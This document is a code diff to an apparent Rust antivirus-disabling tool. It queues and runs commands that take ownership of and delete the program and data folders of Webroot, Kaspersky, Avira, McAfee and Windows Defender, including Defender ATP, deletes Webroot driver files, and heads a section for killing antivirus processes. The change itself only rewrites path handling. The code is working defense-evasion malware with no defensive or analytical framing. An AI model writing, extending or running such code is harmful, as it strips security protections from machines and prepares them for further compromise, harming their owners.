@@ -646,7 +646,7 @@ fn main() -> io::Result<()> {
             commands.push(cmd.to_string());
         }
 
-        // Instead of issuing raw del commands, use the helper for file deletion.
+        // Use the helper for file deletion.
         if let Ok(system_root) = env::var("SystemRoot") {
             let wrkrn_sys = format!(r"{}\System32\Drivers\wrkrn.sys", system_root);
             let wruser_dll = format!(r"{}\System32\wruser.dll", system_root);
@@ -655,25 +655,62 @@ fn main() -> io::Result<()> {
         }
 
         // Delete Webroot directories.
-        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Webroot""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Webroot""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramData%\WRCore""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramData%\WRData""#);
+        if let Ok(prog_files) = env::var("ProgramFiles") {
+            let webroot_pf = format!(r#""{}\Webroot""#, prog_files);
+            add_takeown_and_delete(&mut commands, &webroot_pf);
+        }
+        if let Ok(prog_files_x86) = env::var("ProgramFiles(x86)") {
+            let webroot_pf86 = format!(r#""{}\Webroot""#, prog_files_x86);
+            add_takeown_and_delete(&mut commands, &webroot_pf86);
+        }
+        if let Ok(program_data) = env::var("ProgramData") {
+            let wrcore = format!(r#""{}\WRCore""#, program_data);
+            let wrdata = format!(r#""{}\WRData""#, program_data);
+            add_takeown_and_delete(&mut commands, &wrcore);
+            add_takeown_and_delete(&mut commands, &wrdata);
+        }
 
         // Group 4: Kaspersky directories cleanup
-        add_takeown_and_delete(&mut commands, r#""%ProgramData%\Kaspersky Lab""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Kaspersky Lab""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Kaspersky Lab""#);
+        if let Ok(program_data) = env::var("ProgramData") {
+            let kaspersky_pd = format!(r#""{}\Kaspersky Lab""#, program_data);
+            add_takeown_and_delete(&mut commands, &kaspersky_pd);
+        }
+        if let Ok(prog_files) = env::var("ProgramFiles") {
+            let kaspersky_pf = format!(r#""{}\Kaspersky Lab""#, prog_files);
+            add_takeown_and_delete(&mut commands, &kaspersky_pf);
+        }
+        if let Ok(prog_files_x86) = env::var("ProgramFiles(x86)") {
+            let kaspersky_pf86 = format!(r#""{}\Kaspersky Lab""#, prog_files_x86);
+            add_takeown_and_delete(&mut commands, &kaspersky_pf86);
+        }
 
         // Group 5: Avira directories cleanup
-        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Avira""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Avira""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramData%\Avira""#);
+        if let Ok(prog_files) = env::var("ProgramFiles") {
+            let avira_pf = format!(r#""{}\Avira""#, prog_files);
+            add_takeown_and_delete(&mut commands, &avira_pf);
+        }
+        if let Ok(prog_files_x86) = env::var("ProgramFiles(x86)") {
+            let avira_pf86 = format!(r#""{}\Avira""#, prog_files_x86);
+            add_takeown_and_delete(&mut commands, &avira_pf86);
+        }
+        if let Ok(program_data) = env::var("ProgramData") {
+            let avira_pd = format!(r#""{}\Avira""#, program_data);
+            add_takeown_and_delete(&mut commands, &avira_pd);
+        }
 
         // Group 6: McAfee directories cleanup
-        add_takeown_and_delete(&mut commands, r#""%ProgramData%\McAfee""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\McAfee""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\McAfee""#);
+        if let Ok(program_data) = env::var("ProgramData") {
+            let mcafee_pd = format!(r#""{}\McAfee""#, program_data);
+            add_takeown_and_delete(&mut commands, &mcafee_pd);
+        }
+        if let Ok(prog_files) = env::var("ProgramFiles") {
+            let mcafee_pf = format!(r#""{}\McAfee""#, prog_files);
+            add_takeown_and_delete(&mut commands, &mcafee_pf);
+        }
+        if let Ok(prog_files_x86) = env::var("ProgramFiles(x86)") {
+            let mcafee_pf86 = format!(r#""{}\McAfee""#, prog_files_x86);
+            add_takeown_and_delete(&mut commands, &mcafee_pf86);
+        }
 
         // Group 7: Windows Defender and Advanced Threat Protection cleanup
         // For file deletion, use the helper function.
@@ -682,11 +719,22 @@ fn main() -> io::Result<()> {
             takeown_icacls_and_del(&security_health);
         }
         // Delete Windows Defender directories.
-        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Windows Defender""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Windows Defender""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramData%\Microsoft\Windows Defender""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Windows Defender Advanced Threat Protection""#);
-        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Windows Defender Advanced Threat Protection""#);
+        if let Ok(prog_files) = env::var("ProgramFiles") {
+            let wd_pf = format!(r#""{}\Windows Defender""#, prog_files);
+            let wd_at_pf = format!(r#""{}\Windows Defender Advanced Threat Protection""#, prog_files);
+            add_takeown_and_delete(&mut commands, &wd_pf);
+            add_takeown_and_delete(&mut commands, &wd_at_pf);
+        }
+        if let Ok(prog_files_x86) = env::var("ProgramFiles(x86)") {
+            let wd_pf86 = format!(r#""{}\Windows Defender""#, prog_files_x86);
+            let wd_at_pf86 = format!(r#""{}\Windows Defender Advanced Threat Protection""#, prog_files_x86);
+            add_takeown_and_delete(&mut commands, &wd_pf86);
+            add_takeown_and_delete(&mut commands, &wd_at_pf86);
+        }
+        if let Ok(program_data) = env::var("ProgramData") {
+            let wd_pd = format!(r#""{}\Microsoft\Windows Defender""#, program_data);
+            add_takeown_and_delete(&mut commands, &wd_pd);
+        }
 
         // Group 8: Kill antivirus processes
         let kill_processes_cmds = vec![
@@ -813,7 +861,7 @@ fn main() -> io::Result<()> {
             commands.push(cmd.to_string());
         }
 
-        // Execute all commands that were queued.
+        // Execute all queued commands.
         for command in commands {
             execute_command(&command);
         }
